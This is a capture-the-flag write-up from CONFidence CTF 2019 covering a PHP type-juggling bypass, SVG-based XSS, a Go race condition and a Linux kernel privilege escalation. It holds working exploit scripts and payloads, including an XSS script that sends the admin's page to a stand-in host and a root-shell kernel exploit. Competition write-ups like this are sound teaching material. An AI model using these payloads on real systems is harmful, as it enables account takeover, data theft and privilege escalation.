# CONFidence CTF 2019

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20190317-confidencectf/) of this writeup.**


 - [CONFidence CTF 2019](#confidence-ctf-2019)
   - [Web](#web)
     - [My admin panel](#my-admin-panel)
     - [Web 50](#web-50)
       - [Solution 1: XSS in SVG image](#solution-1-xss-in-svg-image)
       - [Solution 2: Cache Poisoning](#solution-2-cache-poisoning)
     - [The Lottery](#the-lottery)
       - [Failed Attempts](#failed-attempts)
   - [Pwn](#pwn)
     - [p4fmt](#p4fmt)
       - [p4fmt.ko](#p4fmtko)
       - [load_p4_binary](#load_p4_binary)
       - [Vulnerability](#vulnerability)
       - [Privilege escalation](#privilege-escalation)
       - [Constraints](#constraints)
       - [Exploit](#exploit)
       - [Root shell](#root-shell)


We got second place in CONFidence CTF 2019 with only one challenge left. Thanks to the organizer [p4](https://twitter.com/p4_team) from Polish for such a great event! 

## Web

### My admin panel

> RB363

This challenge is a simple PHP code review challange.

```php
<?php

include '../func.php';
include '../config.php';

if (!$_COOKIE['otadmin']) {
    exit("Not authenticated.\n");
}

if (!preg_match('/^{"hash": [0-9A-Z\"]+}$/', $_COOKIE['otadmin'])) {
    echo "COOKIE TAMPERING xD IM A SECURITY EXPERT\n";
    exit();
}

$session_data = json_decode($_COOKIE['otadmin'], true);

if ($session_data === NULL) { echo "COOKIE TAMPERING xD IM A SECURITY EXPERT\n"; exit(); }

if ($session_data['hash'] != strtoupper(MD5($cfg_pass))) {
    echo("I CAN EVEN GIVE YOU A HINT XD \n");

    for ($i = 0; i < strlen(MD5('xDdddddd')); i++) {
        echo(ord(MD5($cfg_pass)[$i]) & 0xC0);
    }
    exit("\n");
}

display_admin();
```

From the source code above, we need to find a hash could pass the comparison between `$session_data['hash']` and `MD5($cfg_pass)`

And, when one of the operand is a string and the other one is a number, the operator `!=` in PHP would change string operand into to a number and the comparison performed numerically.

e.g. `var_dump(100 == "100abc"); // 100 == 100 -> true`

By this feature in PHP, we can try to input some number and bypass this comparison.

Plus, I got a hint `0006464640640064000646464640006400640640646400` when I try to input something to test.

From the hint, we know the string start with at most 3 continuous digit characters.

Therefore, we just need to find a number from 0 to 999 could pass the comparison.

```python
#!/usr/bin/env python3
import sys
import requests

hint = "0006464640640064000646464640006400640640646400"
limit = 1000
url = "http://gameserver.zajebistyc.tf/admin/login.php"

for i in range(limit):
	cookies = dict(otadmin='{"hash": ' + str(i) + '}')
	sys.stdout.write('\rTesting value: ' + str(i) + ' of ' + str(limit))
	sys.stdout.flush()

	html = requests.get(url, cookies=cookies)
	if hint not in html.text: 
		break

print()
print()
print(html.text)
```
With my script above, we can hit the md5 when `$session_data['hash']` is 389.

And the flag is shown: 
```
Congratulations! p4{wtf_php_comparisons_how_do_they_work...}
```


### Web 50

> bookgin

In this challenge we can edit our profile page, and report a link to admin. It's a classic XSS scenario.


#### Solution 1: XSS in SVG image

Based on the error page, the backend server is probably nginx + Flask(Python) + CloudFlare.

In the profile page, we can upload an avatar to the server.  The server will check if this file is an valid image, and the size has to be 100x100. I rename a valid PNG image to `foo.html` and uploaded it. However the HTTP  content type is still `image/png`. The CloudFlare seems to [overwrite the content-type](https://community.cloudflare.com/t/cloudflare-is-changing-the-response-content-type/3152) based on the content.

Note if the content type is `image/png`, sending this link to admin will not trigger the XSS payload. The browser will simply render it as an image (or download it). So what if we upload a valid 100x100 image, but the CloudFlare fails to detect the content-type so that we can trigger the XSS payload?

Since I don't know which library is used for determine the filetype and extract the size, I have to write a script to try all possible image format. I use [imagemagick supported filetype](https://imagemagick.org/script/formats.php#supported) as a list to create lots of images with different formats.

```python
#!/usr/bin/env python3
import requests, glob
import secrets
s = requests.session()
r = s.post('http://web50.zajebistyc.tf/login', data=dict(login='laiph6Ieroh4iema',password='laiph6Ieroh4iema'))
for f in glob.glob("file/*"):
    print(f)
    filename = secrets.token_urlsafe(16) + '.html'
    payload = open(f, 'rb').read()
    files = { 
        'avatar': (filename, payload)
    }   
    
    r = s.post('http://web50.zajebistyc.tf/profile/laiph6Ieroh4iema', files=files)
    if 'not a valid image' in r.text[:150]:
        print(r.text)
        continue
    if 'sorry, we only accept 100x100 images' in r.text[:150]:
        print(r.text)
        continue
    url = 'http://web50.zajebistyc.tf/avatar/62eee5152305547ff387eef08af028d340611ce15db259aeb714f6518328885b/'+filename
    print(url)
    r = s.get(url)
    print(r.headers['Content-Type'])
```

Unfortunately, either the server said it's an invalid image, or CloudFlare can correctly determine the filetype.......

```
image/gif
image/jp2
image/jpeg
image/png
image/svg+xml
image/tiff
image/x-dpx
image/x-eps
image/x-exr
image/x-ms-bmp
image/x-pcx
image/x-portable-bitmap
image/x-portable-greymap
image/x-portable-pixmap
image/x-xpmi
```

It seems that the server uses [libmagic](https://github.com/threatstack/libmagic/blob/1249b5cd02c3b6fb9b917d16c76bc76c862932b6/magic/Magdir/images#L298-L300) to determine if it's a valid image. It's too difficult to bypass the server check and also make CloudFlare fail to detect the filetype.

After I stuck here for several hours, I wonder what if I can trigger XSS but the content-type is still an image? The SVG is a great medium since it's basically a XML. After googling I found this [PoC of SVG-based XSS](http://xss.cx/xss.svg). The rest is starightforward.

My exploit (thie file extension doesn't matter):

```python
#!/usr/bin/env python3
import requests, glob
import secrets
s = requests.session()
r = s.post('http://web50.zajebistyc.tf/login', data=dict(login='laiph6Ieroh4iema',password='laiph6Ieroh4iema'))
filename = secrets.token_urlsafe(16) + '.html'
payload = '''<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="100px" height="100px" viewBox="0 0 100 100" enable-background="new 0 0 100 100" xml:space="preserve">  
   <script>
      fetch("http://web50.zajebistyc.tf/profile/admin").then(r => r.text()).then(t => fetch("//example.com/"+btoa(t)));
   </script>
<image id="image0" width="100" height="100" x="0" y="0"
    href="" />
</svg>
'''
files = {
    'avatar': (filename, payload)
}
r = s.post('http://web50.zajebistyc.tf/profile/laiph6Ieroh4iema', files=files)
if 'not a valid image' in r.text[:150]:
    print(r.text)
if 'sorry, we only accept 100x100 images' in r.text[:150]:
    print(r.text)
url = 'http://web50.zajebistyc.tf/avatar/62eee5152305547ff387eef08af028d340611ce15db259aeb714f6518328885b/'+filename
print(url)
r = s.get(url)
print(r.headers['Content-Type'])

# p4{15_1t_1m4g3_or_n0t?}
```

#### Solution 2: Cache Poisoning

This approach is mentioned in the IRC channel after the competition ends. Thanks to organizers *Rev\`*, *Shalom*. The payload is credited to *toob*.

In fact, in the profile "edit" page, we can insert arbitrary HTML attribute in the shoe size selection HTML tag. Though it filters `<>"`, it can easily be bypassed using backtick.

Changing the shoe size to this will pop up an alert screen:

```htmlmixed
shoe size:
30 autofocus onfocus=alert`xss`

HTML:
<select name="shoesize" value=0 autofocus onfocus=`xss`>
```

We can use `eval` and `atob` to create a longer payload:

```htmlmixed
0 autofocus onfocus=eval(atob(`AAAAA`))
```

However, the profile edit page can only be accessed by the user itself. The next problem is: how can we make admin visit this page? 

We use cache posoning. Here is an article explaining [cache poisoning attack by Omer Gil](http://omergil.blogspot.com/2017/02/web-cache-deception-attack.html). The link is credited *herrera\_*. Thus we can use a special username like `foobar.css`, so [cloudflare will cache them](https://support.cloudflare.com/hc/en-us/articles/200172516-Which-file-extensions-does-CloudFlare-cache-for-static-content-). Then the admin will visit this cached page and become our XSS victim.

Note that I solved this challenge using solution 1, so I didn't fully test this.

### The Lottery

> bookgin, sasdf


In this challenge, we have the source code written in Go lang. In order to get flag, we have to achieve one of the two conditions.

1. `isWinner()`: Each tick (5 seconds) the service will sum up the account's ammount and a random number. If it's equal to 0x133700, you get the flag.
2. `isMillionaire`: If the sum of user's amount is more than a million, you get the flag.

```go
superUser := s.lottery.IsWinner(name) || account.IsMillionaire()

func (a *Account) IsMillionaire() bool {
  sum := 0
  for _, a := range a.Amounts {
    sum += a
  }
  return sum >= 1000000                                                                                                
}

func (a *Account) AddAmount(amount int) error {
  if amount < 0 || amount > 99 {
    return errors.Wrapf(ErrInvalidData, "amount must be positive and less than %d: got '%d'", MaxAmount+1, amount)
  }
  if len(a.Amounts) >= 4 {
    return errors.Wrapf(ErrInvalidData, "reached maximum number of amounts (%d)", MaxAmountsLen)
  }
  a.Amounts = append(a.Amounts, amount)
  return nil
}

func (l *Lottery) evaluate() {
  l.mutex.Lock()
  defer l.mutex.Unlock()
  accounts := l.accounts
  l.winners = make(map[string]struct{})
  l.accounts = make(map[string]Account)
  for name, account := range accounts {
    amounts := append(account.Amounts, randInt(999913, 3700000))
    sum := 0
    for _, a := range amounts {
      sum += a
    } 
    if sum == 0x133700 {
      l.winners[name] = struct{}{}
    } 
  }                                                                                                                    
}
```

However, because the strict validation in the `AddAmount()`, it seems impossible to get the flag. What's worse, the random seed is based on `time.Now().UnixNano()`, which is pretty robust.

Let's revisit the two condition again. If somehow we can make the big random number being appended into user's amount, we can make a millionaire! Also, there is RWmutex in the code; is it possible to achieve this with race condition?

A quick search about golang append leads me [this article](https://medium.com/@cep21/gos-append-is-not-always-thread-safe-a3034db7975), which explains clearly that `append` in golang is not thread-safe. 

Here is a simple PoC:

```go
package main

import (
    "sync"
    "fmt"
)

func Log(s []int) {
    fmt.Printf("len=%d cap=%d %v\n", len(s), cap(s), s)
}


func main() {
    x := make([]int, 0, 8)
    Log(x)

    wg := sync.WaitGroup{}
    wg.Add(2)
    go func() {
        defer wg.Done()
        y := append(x, 1,2)
        Log(y)
    }()
    go func() {
        defer wg.Done()
        z := append(x, 3,4)
        Log(z)
    }()
    wg.Wait()
}
```

Running a few times and you will get:

```
len=0 cap=8 []
len=2 cap=8 [1 2]
len=2 cap=8 [1 2]
```

The underlying reason behind this is explained well in the article. Therefore the idea is straightforward now. The exploit steps:

1. Create a account and append 3 numbers such that the capacity of the array is 4.
2. Add this account into the lottery.
3. Append a new number `87` into the account.
4. If the `evaluate()` is invoked at the same time, our number `87` will be replaced with this big random number.
5. We become millionaires now!

My exploit script:

```python
#!/usr/bin/env python3
import requests

s = requests.session()

url = 'https://lottery.zajebistyc.tf'

names = []
for _ in range(999999):
    r = s.post(url + "/account").json()
    name = r['name']
    names.append(name)
    for _ in range(3):
        r = s.post(url + f'/account/{name}/amount', json=dict(amount=99))
        #print(r.text)
    r = s.get(url + f'/account/{name}')
    #print(r.text)

    r = s.post(url + f'/lottery/add', json=dict(accountName=name))
    #print(r.text)

    r = s.post(url + f'/account/{name}/amount', json=dict(amount=87))
    #print(r.text)
    r = s.get(url + f'/account/{name}')
    print(r.text)
    with open('log','a') as f:
        print(r.text, file=f)
```


After running for a few minutes, we got the juicy flag:

```
{"account":{"name":"TmkFbDtDIFyLjiCI","amounts":[99,99,99,2042896]},"flag":"p4{fucking-go-slices.com}"}
```

#### Failed Attempts

- RWlock: In the source code, when we use `AccountAddAmount` API, instead of a write lock, it uses a RLock (read lock). Thus it's possible to achieve race condition here. However I don't think it's useful.


## Pwn

### p4fmt

> yuawn, billy
* The files
```
.
├── bzImage
├── initramfs.cpio.gz
└── run.sh
```
* run<span></span>.sh:
```sh
#!/bin/bash
qemu-system-x86_64 -kernel ./bzImage \
		-initrd ./initramfs.cpio.gz \
		-nographic \
		-append "console=ttyS0" \
```
Extract the content of rootfs:
```shell
gunzip initramfs.cpio.gz && cpio -idmv < initramfs.cpio
```
rootfs:
```
...
├── bzImage
├── dev
├── etc
│   └── passwd
├── flag
├── home
│   └── pwn
├── init
├── p4fmt.ko
├── proc
├── run.sh
├── sbin
├── sys
├── tmp
└── usr
    ├── bin
    └── sbin

12 directories, 399 files
```
The `flag` and kernel module `p4fmt.ko` are placed in the root directory.
```sh
/ $ ls -l flag
-rw-------    1 root     0               28 Mar 15 21:38 flag
```
Only root can read the flag, therefore our the goal is privilege escalation obviously.
#### p4fmt.ko
It's a simple kernel module:
```c
__int64 load_p4_binary(linux_binprm *_bprm){
  ...
}
__int64 p4fmt_init()
{
  _register_binfmt(&p4format, 1LL);
  return 0LL;
}

__int64 p4fmt_exit()
{
  return unregister_binfmt(&p4format);
}
```
It register a new binary format for p4 binary, and `load_p4_binary` is similar with `load_elf_binary` but for p4 format.

#### load_p4_binary
It first check whether the binary file is start with `"P4"`, if not it will return `-ENOEXEC`.
After some reversing on the function, we can simply figure out the file format of p4 binary:
```c
struct p4fmt{
    char magic[2] = "P4",
    int8_t version,
    int8_t arg,
    int32_t load_count,
    int64_t header_offset, // offset to loads
    int64_t entry,
    char _gap[header_offset - 0x18],
    struct load loads[load_count]
}

struct load{
    int64_t addr,
    int64_t length,
    int64_t offset
};
```
Version should be 0, otherwise it will `printk("Unknown version")`. There are two loading method determined by `arg`. If arg be 1, it will load the `address, length, offset` from header and do `vm_mmap`.
We can generate a simple Hello World p4 binary:
```python
binary = 'P4'               # MAGIC
binary += p8(0)             # version
binary += p8(1)             # arg
binary += p32(1)            # load_count
binary += p64( 0x18 )       # header_offset
binary += p64( 0x400080 )   # entry
binary += p64( 0x400000 | 7 ) + p64( 0x1000 ) + p64( 0 ) # addr , length , offset
binary = binary.ljust( 0x80 , '\0' ) # 128
binary += asm(
    shellcraft.echo( 'Hello World!' ) +
    shellcraft.exit(0)
)
```
Result:
```sh
/tmp $ ./hello_word
[   22.679510] vm_mmap(load_addr=0x400000, length=0x1000, offset=0x0, prot=7)
Hello World!
/tmp $
```
#### Vulnerability
First I thought whether can do something with `vm_mmap`, because there was no checking for the arguments, but there were `MAP_PRIVATE` and `ADDR_LIMIT_32BIT` flags, so it seemed like nothing to do.

After then, take a look at `struct linux_binprm`:
```C
struct linux_binprm {
	char buf[BINPRM_BUF_SIZE];
	struct vm_area_struct *vma;
	unsigned long vma_pages;
	struct mm_struct *mm;
	unsigned long p; /* current top of mem */
	unsigned long argmin; /* rlimit marker for copy_strings() */
	unsigned int called_set_creds:1, cap_elevated:1, secureexec:1;
	unsigned int recursion_depth; /* only for search_binary_handler() */
	struct file * file;
	struct cred *cred;	/* new credentials */
	int unsafe;		/* how unsafe this exec is (mask of LSM_UNSAFE_*) */
	unsigned int per_clear;	/* bits to clear in current->personality */
	int argc, envc;
	const char * filename;	/* Name of binary as seen by procps */
	const char * interp;	
	unsigned interp_flags;
	unsigned interp_data;
	unsigned long loader, exec;
	struct rlimit rlim_stack; /* Saved RLIMIT_STACK used during exec. */
};
```
Binary header will be stored to `bprm->buf[]`, and the part of `load_p4_binary` where it process memory loading:
```c
if ( (p4fmt)(bprm->buf).arg > 1u )
  return (unsigned int)-EINVAL;
retval = flush_old_exec(bprm, P4MAG);
if ( !retval )
{
  current->personality = 0x800000;
  setup_new_exec(bprm);
  arg = (p4fmt)(bprm->buf).arg;
  if ( arg )
  {
    if ( arg != 1 )
      return (unsigned int)-EINVAL;
      if ( (p4fmt)(bprm->buf).load_count )
      {
        loads = (load *)&buf->magic[ (p4fmt)(bprm->buf).header_offset ];
        do
        {
          addr = loads->addr;
          prot = loads->addr & 7LL;
          base = loads->addr & 0xFFFFFFFFFFFFF000LL;
          printk("vm_mmap(load_addr=0x%llx, length=0x%llx, offset=0x%llx, prot=%d)\n", base, loads->length, loads->offset, prot);
          offset = loads->offset;
          length = loads->length;
          if ( addr & 8 )
          {
            vm_mmap(0LL, base, length, prot, 2LL, offset);
            printk("clear_user(addr=0x%llx, length=0x%llx)\n", loads->addr, loads->length);
            _clear_user(loads->addr, loads->length);
          }
          else
          {
            vm_mmap(bprm->file, base, length, prot, 2LL, offset);
          }
          ++retval;
          ++loads;
      }while ( (p4fmt)(bprm->buf).load_count > retval );
    }
  }
  else{

.....
```
The problem is that it does not has bounds checking for `header_offset` and `load_count`, we can use `header_offset` to control the pointer:
`loads = (load *)&buf->magic[ (p4fmt *)(bprm->buf).header_offset ];`,
and over reading memory by setting up `load_count`,  therefore we can leak the content in `struct linux_binprm`.

PoC:
```python
binary = 'P4'                # MAGIC
binary += p8(0)              # version
binary += p8(1)              # arg
binary += p32( 5 )           # load_count
binary += p64( 0x80 - 0x18 ) # header_offset
```
Result:
```sh
/tmp $ ./leak
[    7.607129] vm_mmap(load_addr=0x0, length=0x0, offset=0x0, prot=0)
[    7.607460] vm_mmap(load_addr=0x7fffffffe000, length=0x100000001, offset=0x0, prot=3)
[    7.607952] vm_mmap(load_addr=0xffff9f160213d000, length=0x0, offset=0x7fffffffeff1, prot=0)
[    7.608132] vm_mmap(load_addr=0x0, length=0xffff9f16020c8b40, offset=0x800000, prot=0)
[    7.608315] vm_mmap(load_addr=0xfffffffffffff000, length=0x1, offset=0x0, prot=7)
[    7.608561] clear_user(addr=0xffffffffffffffff, length=0x1)
[    7.610219] leak[526]: segfault at 0 ip 0000000000000000 sp 00007fffffffef93 error 14
[    7.610786] Code: Bad RIP value.
Segmentation fault
/tmp $
```
#### Privilege escalation
For now, we can use kernel information leak to bypass kaslr, but how to achieve privilege escalation.
We can simplify the process of `load_p4_binary`:
1. Check for file format.
2. `flush_old_exec(bprm, P4MAG)`
3. `setup_new_exec(bprm)`
4. Process memory loading.
5. `install_exec_creds(bprm)`
6. `set_binfmt(&p4format)`
7. `setup_arg_pages(bprm, randomize_stack_top(STACK_TOP), 0LL)`
8. `finalize_exec(bprm)`
9. `start_thread(regs, p4_entry, bprm->p)`

`install_exec_creds(bprm)` is interesting, it will do `commit_creds(bprm->cred);` inside.
```c
void install_exec_creds(struct linux_binprm *bprm)
{
	security_bprm_committing_creds(bprm);

	commit_creds(bprm->cred);
	bprm->cred = NULL;

	if (get_dumpable(current->mm) != SUID_DUMP_USER)
		perf_event_exit_task(current);

	security_bprm_committed_creds(bprm);
	mutex_unlock(&current->signal->cred_guard_mutex);
}
```
We are already able to leak the address of `struct cred *cred` in `struct linux_binprm *bprm`, and the `struct cred`:
```c
struct cred {
	atomic_t	usage;
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
	kernel_cap_t	cap_ambient;	/* Ambient capability set */
    ...
```
If we can overwrite the `uid` and `gid` in `bprm->cred` before calling `install_exec_creds`, so that it would install the new `cred`!

But how to set the `uid` and `gid` to zero, remember there is a funtion named `_clear_user()`:
```
Name
clear_user — Zero a block of memory in user space.

Synopsis
unsigned long clear_user (void __user * to, unsigned long n);
```
There is `_clear_user(loads->addr, loads->length);` in `load_p4_binary` where `loads->addr` and `loads->length` are controllable, that means we can zero a block of memory everywhere. That's awesome!
#### Constraints
Although we are able to leak the memory, but we can't do the leak and setting up header at the same time with the same binary.
Execute another time, the address of `cred` has some random offset, but I found the interesting thing:
```
[+] cred -> 0xffff99cb021fa180
[+] cred -> 0xffff99cb021faf00
[+] cred -> 0xffff99cb021fab40
[+] cred -> 0xffff99cb021faa80
[+] cred -> 0xffff99cb021facc0

[+] cred -> 0xffff99cb021fa180
[+] cred -> 0xffff99cb021faf00
[+] cred -> 0xffff99cb021fab40
[+] cred -> 0xffff99cb021faa80
[+] cred -> 0xffff99cb021facc0
```
The address will be the same when execute the binary every five times, don't know the reason...

#### Exploit
Generate a p4 binary for kernel memory leak first, then set up loads header of second p4 binary to trigger `_clear_user( bprm->cred | 8 + 0x10 , 0x48 ); // +0x10 prevent crashing caused by the NULL pointer`.
`install_exec_creds(bprm)` will call `commit_creds(bprm->cred);` and process our new `bprm->cred`, then execute our p4 binary with root privilege!
Execute shellocde and enjoy the root shell :D

#### Root shell
![](https://i.imgur.com/u1j3uNG.png)
exploit:
```python
#!/usr/bin/env python
from pwn import *
import base64
import re

# p4{4r3_y0U_4_81n4ry_N1njA?}

context.arch = 'amd64'
host , port = 'p4fmt.zajebistyc.tf' , 30002
y = remote( host , port )

def gen_p4_binary( version = 0 , arg = 1 , section_header_offset = 0x18 , sections_len = 0 , entry = 0 , sections = [] , code = '' ):
    b = 'P4' # MAGIC
    b += p8( version ) + p8( arg ) + p32( sections_len ) + p64( section_header_offset ) + p64( entry )
    b += ''.join( flat(s) for s in sections )
    if code:
        b = b.ljust( entry & 0xfff , '\0' )
        b += code
    return b

def sp( cmd ):
    y.sendlineafter( '$' , cmd )

def leak():
    sp( './leak' )
    y.recvuntil( 'length=' )
    cred = int( y.recvuntil( ',' )[:-1] , 16 )
    success( 'cred -> %s' % hex( cred ) )
    return cred

sp( 'cd /tmp' )

p4 = gen_p4_binary( section_header_offset = 0x90 , sections_len = 1 )
sp( "echo %s | base64 -d > ./leak" % ( base64.b64encode( p4 ) ) )
sp( 'chmod +x ./leak' )
cred = leak() # 1

p4 = gen_p4_binary( sections = [[0x7000000 | 7, 0x1000, 0], [cred | 8 + 0x10, 0x48, 0]] , sections_len = 2  , entry = 0x7000090 , code = asm( shellcraft.sh() ) )
sp( 'printf \'\\%s\' > ./pwn' % '\\'.join( oct( ord( _ ) )[1:].rjust( 3 ,'0' ) for _ in p4 ) )
sp( 'chmod +x ./pwn' )

'''
[+] cred -> 0xffff99cb021fa180
[+] cred -> 0xffff99cb021faf00
[+] cred -> 0xffff99cb021fab40
[+] cred -> 0xffff99cb021faa80
[+] cred -> 0xffff99cb021facc0

[+] cred -> 0xffff99cb021fa180
[+] cred -> 0xffff99cb021faf00
[+] cred -> 0xffff99cb021fab40
[+] cred -> 0xffff99cb021faa80
[+] cred -> 0xffff99cb021facc0
'''

for _ in range(3):
    leak()

sp( './pwn' ) # cred should be the same as first leak

y.sendlineafter( '/tmp #' , 'cat /flag' ) # root !

y.interactive()
```
